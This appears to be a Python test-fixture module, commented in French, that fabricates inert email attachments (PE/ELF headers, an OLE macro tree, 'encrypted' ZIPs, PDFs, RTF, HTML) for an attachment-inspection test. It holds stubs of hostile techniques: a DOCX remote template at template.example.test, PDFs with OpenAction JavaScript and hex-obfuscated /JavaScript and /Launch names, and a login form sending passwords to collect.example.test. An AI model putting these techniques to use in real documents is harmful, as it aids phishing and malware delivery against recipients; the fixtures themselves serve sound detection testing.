"""Pièces jointes **fabriquées et inoffensives** pour les tests de l'étape 2.13.

Aucun vrai logiciel malveillant n'est versionné : chaque fichier ne reproduit que la
**structure** que l'inspection reconnaît (signature, arborescence OLE, membres d'une
archive, noms d'un PDF). Rien ici ne s'exécute : l'« exécutable » n'a que l'en-tête
``MZ``, la macro n'a pas de code, le JavaScript du PDF n'est qu'une chaîne.
"""

from __future__ import annotations

import io
import struct
import zipfile

_FREE, _END, _FATSECT, _NOSTREAM = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF


def _ole_entry(name: str, kind: int, child: int = _NOSTREAM, right: int = _NOSTREAM) -> bytes:
    """Entrée de répertoire d'un fichier composé OLE (MS-CFB, 128 octets)."""
    if kind == 0:  # entrée inutilisée
        return b"\x00" * 64 + struct.pack("<HBBIII", 0, 0, 0, *(3 * [_NOSTREAM])) + b"\x00" * 48
    raw = name.encode("utf-16-le") + b"\x00\x00"
    fields = struct.pack("<HBBIII", len(raw), kind, 1, _NOSTREAM, right, child)
    return (
        raw.ljust(64, b"\x00") + fields + b"\x00" * 36 + struct.pack("<II", _END, 0) + b"\x00" * 4
    )


def ole_file(storages: list[str] | None = None, nested: str | None = None) -> bytes:
    """Fichier OLE minimal (version 3) : une racine, ses stockages, un sous-stockage.

    ``ole_file(["Macros"], nested="VBA")`` reproduit l'arborescence ``Macros/VBA`` d'un
    document Word à macros ; ``ole_file(["WordDocument"])`` celle d'un document sans macro.
    """
    storages = storages or ["WordDocument"]
    entries = [_ole_entry("Root Entry", 5, child=1)]
    for index, name in enumerate(storages):
        sibling = index + 2 if index + 1 < len(storages) else _NOSTREAM
        child = len(storages) + 1 if nested and index == 0 else _NOSTREAM
        entries.append(_ole_entry(name, 1, child=child, right=sibling))
    if nested:
        entries.append(_ole_entry(nested, 1))
    while len(entries) % 4:
        entries.append(_ole_entry("", 0))
    directory = b"".join(entries)
    sectors = len(directory) // 512
    header = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 16
    header += struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6) + b"\x00" * 6
    header += struct.pack("<IIIIIIIII", 0, 1, 1, 0, 0x1000, _END, 0, _END, 0)
    header += struct.pack("<I", 0) + struct.pack("<I", _FREE) * 108
    chain = [_FATSECT] + [i + 2 for i in range(sectors - 1)] + [_END]
    fat = struct.pack(f"<{len(chain)}I", *chain).ljust(512, b"\xff")
    return header + fat + directory


def zip_file(members: dict[str, bytes], *, encrypted: tuple[str, ...] = ()) -> bytes:
    """Archive ZIP ; les membres de ``encrypted`` portent le drapeau « chiffré ».

    ``zipfile`` n'écrit pas d'archive chiffrée : on pose le bit 0 du champ « drapeaux »
    dans l'en-tête local et dans le répertoire central, comme le ferait un outil de
    chiffrement. Le contenu reste en clair, ce qui suffit à l'inspection (qui ne
    décompresse jamais les membres).
    """
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, data in members.items():
            archive.writestr(name, data)
    raw = bytearray(buffer.getvalue())
    with zipfile.ZipFile(io.BytesIO(bytes(raw))) as archive:
        offsets = {info.filename: info.header_offset for info in archive.infolist()}
    for name in encrypted:
        raw[offsets[name] + 6] |= 0x1  # en-tête local : drapeaux à l'octet 6
    position = raw.find(b"PK\x01\x02")
    while position >= 0:  # répertoire central : drapeaux à l'octet 8, nom à l'octet 46
        name_length = struct.unpack_from("<H", raw, position + 28)[0]
        name = bytes(raw[position + 46 : position + 46 + name_length]).decode()
        if name in encrypted:
            raw[position + 8] |= 0x1
        position = raw.find(b"PK\x01\x02", position + 46)
    return bytes(raw)


CONTENT_TYPES = b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/"/>'


def docx(*, macros: bool = False, remote_template: bool = False) -> bytes:
    members = {"[Content_Types].xml": CONTENT_TYPES, "word/document.xml": b"<w:document/>"}
    if macros:
        members["word/vbaProject.bin"] = ole_file(["VBA"])
    if remote_template:
        members["word/_rels/settings.xml.rels"] = (
            b'<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
            b'officeDocument/2006/relationships/attachedTemplate" '
            b'Target="https://template.example.test/t.dotm" TargetMode="External"/>'
            b"</Relationships>"
        )
    return zip_file(members)


PE = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 56 + b"This program cannot be run in DOS mode."
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 57
LNK = b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 68
ISO = b"\x00" * 0x8001 + b"CD001" + b"\x00" * 100
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
PDF_PLAIN = b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction [3 0 R /Fit] >> endobj\n%%EOF"
PDF_JAVASCRIPT = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>"
PDF_OBFUSCATED = b"%PDF-1.4\n1 0 obj << /S /J#61va#53cript /JS (x) >> 2 0 obj << /S /L#61unch >>"
RTF_OBJECT = b"{\\rtf1\\ansi{\\object\\objemb{\\*\\objdata 0105000002000000}}}"
RTF_PLAIN = b"{\\rtf1\\ansi Bonjour}"
HTML_LOGIN = (
    b"<!DOCTYPE html><html><body><form action='https://collect.example.test/'>"
    b"<input type='email' name='u'><input type=\"password\" name='p'></form></body></html>"
)
HTML_PLAIN = b"<html><body><p>Votre facture est disponible.</p></body></html>"
